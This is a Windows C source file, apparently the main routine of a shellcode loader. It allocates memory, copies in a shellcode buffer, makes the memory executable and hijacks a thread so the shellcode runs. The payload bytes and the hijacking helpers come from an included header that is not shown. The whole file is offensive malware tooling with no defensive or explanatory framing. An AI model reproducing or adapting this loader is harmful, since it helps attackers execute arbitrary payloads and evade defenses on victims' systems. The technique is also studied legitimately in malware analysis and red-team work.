#include "thread_hijack.h"

int main() {
    // Allocate memory for shellcode
    LPVOID pShellcodeAddr = VirtualAlloc(
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (pShellcodeAddr == NULL) {
        printf("VirtualAlloc failed\n");
        return 1;
    }

    // Copy shellcode to allocated memory
    memcpy(pShellcodeAddr, shellcode, shellcodeSize);

    // Change memory protection to executable
    DWORD oldProtect;
    if (!VirtualProtect(
        pShellcodeAddr,
        shellcodeSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    )) {
        printf("VirtualProtect failed\n");
        VirtualFree(pShellcodeAddr, 0, MEM_RELEASE);
        return 1;
    }

    // Get main thread ID
    DWORD mainThreadId = GetCurrentThreadId();

    // Find a target thread
    DWORD targetThreadId = 0;
    HANDLE hTargetThread = NULL;

    if (!GetLocalThreadHandle(mainThreadId, &targetThreadId, &hTargetThread)) {
        printf("Failed to get target thread handle\n");
        VirtualFree(pShellcodeAddr, 0, MEM_RELEASE);
        return 1;
    }

    printf("Target thread ID: %lu\n", targetThreadId);

    // Hijack the target thread
    if (!HijackThreadWithStack(hTargetThread, pShellcodeAddr)) {
        printf("Thread hijack failed\n");
        CloseHandle(hTargetThread);
        VirtualFree(pShellcodeAddr, 0, MEM_RELEASE);
        return 1;
    }

    // Resume the hijacked thread
    ResumeThread(hTargetThread);
    CloseHandle(hTargetThread);

    printf("Thread hijacked. Shellcode should now be running.\n");

    // Keep process alive
    Sleep(INFINITE);

    // Cleanup (never reached due to Sleep(INFINITE))
    VirtualFree(pShellcodeAddr, 0, MEM_RELEASE);
    return 0;
}
